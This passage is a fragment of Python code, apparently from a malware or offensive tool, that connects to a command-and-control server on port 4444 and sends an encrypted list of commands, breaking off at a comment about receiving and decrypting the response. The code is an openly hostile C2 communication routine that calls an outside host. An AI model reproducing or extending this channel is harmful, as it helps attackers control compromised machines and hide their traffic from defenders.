    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((c2_server, 4444))
        
        # Send the list of commands to the C2 server
        for command in command_list:
            encrypted_command = encrypt_message(command, encryption_key)
            s.sendall(encrypted_command)
            
            # Receive and decrypt the response
